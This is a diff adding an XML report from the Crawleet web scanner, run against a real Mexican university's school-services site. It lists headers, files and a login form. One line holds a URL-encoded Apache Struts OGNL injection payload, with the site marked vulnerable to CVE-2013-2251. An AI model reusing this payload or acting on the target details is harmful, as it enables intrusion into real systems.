@@ -1,0 +1,143 @@
+<Reporte>
+    <execution>
+        <data>Crawleet by truerandom</data>
+        <data>Scan date: 2018-09-27</data>
+        <data>Startpage: http://www.escolares.dgenp.unam.mx/</data>
+        <data>Depth: 4</data>
+        <data>Delay: 0.2</data>
+        <data>MaxFiles: 20</data>
+        <data>Run External Tools: False</data>
+        <data>Excluded dirs: </data>
+        <data>Bruteforce: False</data>
+        <data>Wordlist: /root/crawleet/data/wordlist.txt</data>
+        <data>Bruteforce extensions: </data>
+        <data>Config file: /root/crawleet/data/scanningtools.xml</data>
+        <data>Allow Redirects: False</data>
+        <data>Verify Certs: True</data>
+        <data>Cookies: &amp;lt;RequestsCookieJar[]&amp;gt;</data>
+        <data>Useragent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko</data>
+        <data>Tor: False</data>
+        <data>Proxies:{}</data>
+        <data>Timeout: 3.0</data>
+        <data>IP used: 132.248.124.170</data>
+    </execution>
+    <headers>
+        <data>************ Info Headers **************</data>
+        <data>Server: GlassFish Server Open Source Edition  4.1.1</data>
+        <data>X-Powered-By: JSP/2.3</data>
+        <data>*********Missing Secure Headers*********</data>
+        <data>X-Content-Type-Options not found</data>
+        <data>X-Frame-Options not found</data>
+        <data>Strict-Transport-Security not found</data>
+        <data>X-XSS-Protection not found</data>
+        <data>Content-Security-Policy not found</data>
+        <data>Public-Key-Pins not found</data>
+    </headers>
+    <httpmethods>
+        <data>POST</data>
+        <data>OPTIONS</data>
+        <data>GET</data>
+    </httpmethods>
+    <statistics>
+        <data>Puntuation: 47</data>
+        <data>Priority: </data>
+        <data>2</data>
+        <data>Resources: 3</data>
+        <data>Broken Links: 0</data>
+        <data>Files found: 17</data>
+        <data>External links: 0</data>
+        <data>Directory listing: 0</data>
+        <data>content: 1</data>
+    </statistics>
+    <files>
+        <data>http://escolares.dgenp.unam.mx/css/iae.css</data>
+        <data>http://escolares.dgenp.unam.mx/js/jquery-1.8.0.min.js</data>
+        <data>http://escolares.dgenp.unam.mx/js/roll_over_head.js</data>
+        <data>http://www.escolares.dgenp.unam.mx/css/iae.css</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/ayuda.png</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/globoid.png</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/globopass.png</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/iae.jpg</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/iae_logo.jpg</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/reload.png</data>
+        <data>http://www.escolares.dgenp.unam.mx/images/transparencia.png</data>
+        <data>http://www.escolares.dgenp.unam.mx/js/general.js</data>
+        <data>http://www.escolares.dgenp.unam.mx/js/head.js</data>
+        <data>http://www.escolares.dgenp.unam.mx/js/jquery-1.8.0.min.js</data>
+        <data>http://www.escolares.dgenp.unam.mx/js/pie.js</data>
+        <data>http://www.escolares.dgenp.unam.mx/js/roll_over_head.js</data>
+        <data>http://www.escolares.dgenp.unam.mx/simpleImg.png</data>
+    </files>
+    <content>
+        <data>http://www.escolares.dgenp.unam.mx/inLog -&gt; [(u'USUARIO NO ENCONTRADO', u'USUARIO')]</data>
+    </content>
+    <struts>
+        <data>[ http://www.escolares.dgenp.unam.mx/inLog?%72%65%64%69%72%65%63%74%3a%24%7b%23%72%65%71%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%71%75%65%73%74%27%29%2c%23%61%3d%23%72%65%71%2e%67%65%74%53%65%73%73%69%6f%6e%28%29%2c%23%62%3d%23%61%2e%67%65%74%53%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%28%29%2c%23%63%3d%23%62%2e%67%65%74%52%65%61%6c%50%61%74%68%28%22%2f%22%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%22%74%72%75%65%72%61%6e%64%6f%6d%22%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d ] ====== VULNERABLE TO: cve-2013-2251 =====</data>
+    </struts>
+    <sitemap>
+        
+            <Form>
+                <Path>http://www.escolares.dgenp.unam.mx/inLog</Path>
+                <Method>POST</Method>
+                    <Control>&lt;InputElement 7faf441fd1b0 name='answer' type='text'&gt;</Control>
+                    <Control>&lt;InputElement 7faf441fd0a8 name='clave' type='text'&gt;</Control>
+                    <Control>&lt;InputElement 7faf441fd100 name='pass' type='password'&gt;</Control>
+            </Form>
+            <Form>
+                <Path>http://escolares.dgenp.unam.mx/inLog</Path>
+                <Method>POST</Method>
+                    <Control>&lt;InputElement 7faf441fdba8 name='answer' type='text'&gt;</Control>
+                    <Control>&lt;InputElement 7faf441fd730 name='clave' type='text'&gt;</Control>
+                    <Control>&lt;InputElement 7faf441fdaf8 name='pass' type='password'&gt;</Control>
+            </Form>
+        <Resource>http://www.escolares.dgenp.unam.mx/
+        <status>200</status>
+        <Formulario>
+            <Action>inLog</Action>
+        </Formulario>
+            <Resource>inLog
+            <status>200</status>
+            <Formulario>
+                <Action>/inLog</Action>
+            </Formulario>
+                </Resource>
+            <Resource>css
+                <Resource>iae.css
+                    </Resource>
+                </Resource>
+            <Resource>js
+                <Resource>roll_over_head.js
+                </Resource>
+                <Resource>jquery-1.8.0.min.js
+                </Resource>
+                <Resource>general.js
+                </Resource>
+                <Resource>head.js
+                </Resource>
+                <Resource>pie.js
+                    </Resource>
+                </Resource>
+            <Resource>images
+                <Resource>iae.jpg
+                </Resource>
+                <Resource>ayuda.png
+                </Resource>
+                <Resource>transparencia.png
+                </Resource>
+                <Resource>globoid.png
+                </Resource>
+                <Resource>globopass.png
+                </Resource>
+                <Resource>reload.png
+                </Resource>
+                <Resource>iae_logo.jpg
+                    </Resource>
+                </Resource>
+            <Resource>simpleImg.png
+                </Resource>
+            </Resource>
+    </sitemap>
+    <dnssubdomains>
+        <data>escolares.dgenp.unam.mx</data>
+    </dnssubdomains>
+</Reporte>
